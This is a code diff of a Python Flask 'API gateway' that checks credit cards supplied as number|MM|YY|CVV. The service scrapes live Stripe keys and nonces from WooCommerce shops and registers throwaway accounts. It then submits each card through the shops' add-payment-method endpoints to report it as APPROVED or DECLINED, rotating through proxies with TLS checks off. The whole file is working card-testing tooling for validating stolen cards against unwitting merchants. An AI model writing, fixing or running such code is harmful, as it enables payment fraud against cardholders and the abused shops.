@@ -14,7 +14,7 @@ app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Disable SSL warnings (for stealth/speed)
+# Disable SSL warnings
 requests.packages.urllib3.disable_warnings()
 
 # Hardcoded Proxy List
@@ -34,7 +34,6 @@ PROXY_LIST = [
 def make_request(method, url, session=None, proxy=None, **kwargs):
     """
     Wrapper for requests to handle proxy failover automatically.
-    If proxy fails, it instantly retries without proxy.
     """
     proxies = None
     if proxy:
@@ -45,9 +44,11 @@ def make_request(method, url, session=None, proxy=None, **kwargs):
             response = session.request(method, url, proxies=proxies, timeout=15, verify=False, **kwargs)
         else:
             response = requests.request(method, url, proxies=proxies, timeout=15, verify=False, **kwargs)
-        return response, "direct" if not proxy else "proxy"
+        return response, "proxy" if proxy else "direct"
         
-    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.SSLError, requests.exceptions.ProxyConnectionError) as e:
+    # FIX: Removed non-existent ProxyConnectionError. Added generic ConnectionError.
+    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, 
+            requests.exceptions.SSLError, requests.exceptions.ConnectionError) as e:
         logger.warning(f"Proxy ({proxy}) failed for {url}: {e}. Retrying without proxy.")
         # Retry without proxy
         try:
@@ -66,7 +67,6 @@ def make_request(method, url, session=None, proxy=None, **kwargs):
 def get_stripe_key(domain, proxy=None):
     logger.debug(f"Fetching Stripe key for: {domain}")
     
-    # Comprehensive list of paths where keys might be hiding
     paths = [
         "/my-account/add-payment-method/",
         "/checkout/",
@@ -75,14 +75,13 @@ def get_stripe_key(domain, proxy=None):
         "/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params"
     ]
     
-    # Expanded regex patterns for Publishable Keys
     patterns = [
-        r'pk_live_[a-zA-Z0-9_]{20,}',  # Standard match
-        r'"publishableKey"\s*:\s*"((pk_live_[^"]+))"',  # JS Object
-        r'"stripePublicKey"\s*:\s*"((pk_live_[^"]+))"', # Variable
-        r'stripe\.key\s*=\s*["\']((pk_live_[^"\']+))["\']', # Assignment
-        r'key["\']\s*:\s*["\']((pk_live_[^"\']+))["\']',  # Generic JSON
-        r'data-stripe-key="((pk_live_[^"]+))"' # HTML Attribute
+        r'pk_live_[a-zA-Z0-9_]{20,}', 
+        r'"publishableKey"\s*:\s*"((pk_live_[^"]+))"', 
+        r'"stripePublicKey"\s*:\s*"((pk_live_[^"]+))',
+        r'stripe\.key\s*=\s*["\']((pk_live_[^"\']+))["\']',
+        r'key["\']\s*:\s*["\']((pk_live_[^"\']+))["\']',
+        r'data-stripe-key="((pk_live_[^"]+))"'
     ]
 
     for path in paths:
@@ -94,7 +93,6 @@ def get_stripe_key(domain, proxy=None):
             for pattern in patterns:
                 match = re.search(pattern, content)
                 if match:
-                    # Extract just the key in case the regex captured surrounding context
                     key_clean = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                     if key_clean:
                         logger.info(f"Found Stripe Key: {key_clean.group(0)}")
@@ -104,28 +102,17 @@ def get_stripe_key(domain, proxy=None):
     return "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"
 
 def extract_nonce_from_page(html_content):
-    """
-    Advanced nonce extraction covering multiple WooCommerce versions.
-    """
-    # Ordered by specificity (most likely first)
     patterns = [
-        # UPE (Unified Payment Experience) / Stripe Gateway newer versions
         r'"stripeIntentNonce"\s*:\s*"([^"]+)"',
         r'"add_payment_method_nonce"\s*:\s*"([^"]+)"',
-        
-        # Classic WooCommerce / Stripe
         r'wc-stripe-create-and-confirm-setup-intent["\']?\]\["nonce"\]\s*=\s*"([^"]+)"',
         r'wc_stripe_params[^}]*"nonce"\s*:\s*"([^"]+)"',
         r'wc_stripe_elements_params[^}]*"nonce"\s*:\s*"([^"]+)"',
-        
-        # Generic AJAX Nonces
         r'name="_ajax_nonce"[^>]*value="([^"]+)"',
         r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"',
         r'name="woocommerce-login-nonce"[^>]*value="([^"]+)"',
-        
-        # JS Variables
         r'var\s+wc_stripe_create_and_confirm_setup_intent_nonce\s*=\s*"([^"]+)"',
-        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10,32})["\']', # Generic hex nonce
+        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10,32})["\']',
         r'_wpnonce["\']?\s*:\s*["\']([^"\']+)["\']'
     ]
     
@@ -133,13 +120,9 @@ def extract_nonce_from_page(html_content):
         match = re.search(pattern, html_content, re.IGNORECASE)
         if match:
             return match.group(1)
-            
     return None
 
 def get_nonce(domain, session, proxy=None):
-    """
-    Tries multiple pages to find a valid nonce.
-    """
     urls = [
         f"https://{domain}/my-account/add-payment-method/",
         f"https://{domain}/checkout/",
@@ -156,10 +139,6 @@ def get_nonce(domain, session, proxy=None):
     return None
 
 def register_account(domain, session, proxy=None):
-    """
-    Attempts to register a random account.
-    Returns (Success: Bool, Message: String)
-    """
     url = f"https://{domain}/my-account/"
     resp, _ = make_request('GET', url, session=session, proxy=proxy)
     
@@ -181,7 +160,7 @@ def register_account(domain, session, proxy=None):
         'woocommerce-register-nonce': nonce,
         '_wp_http_referer': '/my-account/',
         'register': 'Register',
-        'e_consent': 'yes' # GDPR compliance often needed
+        'e_consent': 'yes'
     }
     
     post_resp, _ = make_request('POST', url, session=session, proxy=proxy, data=reg_data)
@@ -194,7 +173,6 @@ def register_account(domain, session, proxy=None):
 def process_card(domain, ccx, proxy=None):
     ccx = ccx.strip()
     
-    # Robust Card Parsing
     try:
         parts = ccx.split("|")
         n = parts[0]
@@ -202,11 +180,10 @@ def process_card(domain, ccx, proxy=None):
         yy = parts[2]
         cvc = parts[3]
         
-        # Handle Year format (24 -> 2024, 2024 -> 2024)
         if len(yy) == 2:
             yy = "20" + yy
         elif len(yy) == 4:
-            pass # keep as is
+            pass 
         else:
             return {"status": "ERROR", "response": "Invalid Year Format", "cc": ccx, "proxy": "N/A"}
             
@@ -217,19 +194,10 @@ def process_card(domain, ccx, proxy=None):
     session = requests.Session()
     session.headers.update({'User-Agent': user_agent})
 
-    # 1. Get Stripe Publishable Key
     stripe_key = get_stripe_key(domain, proxy)
-    
-    # 2. Get Nonce
     nonce = get_nonce(domain, session, proxy)
     
-    # 3. Optional Registration (Only if we want to test logged-in flows, 
-    #    but often 'Add Payment Method' works with a valid nonce without login if guest checkout is enabled)
-    #    We will proceed without forcing registration to avoid triggering bot defenses, 
-    #    unless the specific site requires it. 
-    
     if not nonce:
-        # Try registering as a last resort to get a fresh session/nonce
         logger.info("Nonce not found, trying registration...")
         reg_success, _ = register_account(domain, session, proxy)
         if reg_success:
@@ -238,7 +206,6 @@ def process_card(domain, ccx, proxy=None):
     if not nonce:
         return {"status": "DECLINED", "response": "Failed to extract valid nonce from site", "cc": ccx, "proxy": proxy if proxy else "Direct"}
 
-    # 4. Create Stripe Payment Method (Client-side simulation)
     payment_method_data = {
         'type': 'card',
         'card[number]': n,
@@ -246,7 +213,7 @@ def process_card(domain, ccx, proxy=None):
         'card[exp_year]': yy,
         'card[exp_month]': mm,
         'billing_details[address][country]': 'US',
-        'billing_details[address][postal_code]': '10012', # Valid US Zip
+        'billing_details[address][postal_code]': '10012',
         'billing_details[name]': 'Sahil Pro',
         'key': stripe_key,
         'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}',
@@ -277,11 +244,7 @@ def process_card(domain, ccx, proxy=None):
     payment_method_id = pm_json['id']
     logger.info(f"Payment Method Created: {payment_method_id}")
 
-    # 5. Send to WooCommerce (Server-side)
-    
-    # Prepare multiple endpoint/payload combinations to ensure compatibility
     endpoints = [
-        # Method A: Unified Payment Experience / Newest Plugin
         {
             'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
             'payload': {
@@ -290,7 +253,6 @@ def process_card(domain, ccx, proxy=None):
                 '_ajax_nonce': nonce
             }
         },
-        # Method B: Legacy / Older Plugin
         {
             'url': f'https://{domain}/?wc-ajax=wc_stripe_save_payment_method',
             'payload': {
@@ -298,7 +260,6 @@ def process_card(domain, ccx, proxy=None):
                 'nonce': nonce
             }
         },
-        # Method C: Admin AJAX Fallback
         {
             'url': f'https://{domain}/wp-admin/admin-ajax.php',
             'payload': {
@@ -307,7 +268,6 @@ def process_card(domain, ccx, proxy=None):
                 '_ajax_nonce': nonce
             }
         },
-        # Method D: Add Payment Method Endpoint
         {
             'url': f'https://{domain}/my-account/add-payment-method/',
             'payload': {
@@ -340,11 +300,9 @@ def process_card(domain, ccx, proxy=None):
             if not resp:
                 continue
 
-            # Parse JSON if possible
             try:
                 data = resp.json()
             except:
-                # Sometimes returns 200 OK with HTML on success, or raw text
                 if "Payment method added" in resp.text or "Successfully added" in resp.text:
                     return {"status": "APPROVED", "response": "Payment method successfully added (HTML Response)", "cc": ccx, "proxy": status}
                 logger.debug(f"Non-JSON response: {resp.text[:200]}")
@@ -352,23 +310,14 @@ def process_card(domain, ccx, proxy=None):
 
             logger.debug(f"Endpoint Response: {data}")
 
-            # Analyze Response
             if data.get('success'):
                 result_data = data.get('data', {})
                 if result_data.get('status') == 'succeeded':
                      return {"status": "APPROVED", "response": "Chargeable / Setup Succeeded", "cc": ccx, "proxy": status}
                 
-                # Some setups return success with status 'requires_action' (3DS), 
-                # but for checking validity, getting this far often means the card is valid.
-                # However, we will mark as DECLINED if 3DS is required for strict auth checking.
                 if result_data.get('status') == 'requires_action':
                     return {"status": "DECLINED", "response": "3D Secure Required (Card Valid but Auth Needed)", "cc": ccx, "proxy": status}
 
-            # Check for specific error messages that might indicate success in some weird plugin implementations
-            if 'result' in data and data['result'] == 'success':
-                 return {"status": "APPROVED", "response": "Gateway Success", "cc": ccx, "proxy": status}
-
-            # Specific Error Handling
             if 'data' in data and 'error' in data['data']:
                 msg = data['data']['error'].get('message', '').lower()
                 if 'your card was declined' in msg or 'do not honor' in msg:
@@ -388,22 +337,17 @@ def api_gateway():
     cc = request.args.get('cc')
     key = request.args.get('key')
 
-    # Auth Check
     if key and key != "inferno":
         return jsonify({"error": "Unauthorized"}), 401
 
-    # Validation
     if not site or not cc:
         return jsonify({"status": "ERROR", "response": "Missing site or cc"}), 400
 
-    # Clean Domain
     domain = site.replace("https://", "").replace("http://", "").strip().split('/')[0]
 
-    # Regex format check for CC
     if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
          return jsonify({"status": "ERROR", "response": "Invalid CC Format (Number|MM|YY|CVV)"}), 400
 
-    # Select Proxy
     proxy_to_use = random.choice(PROXY_LIST)
 
     try:
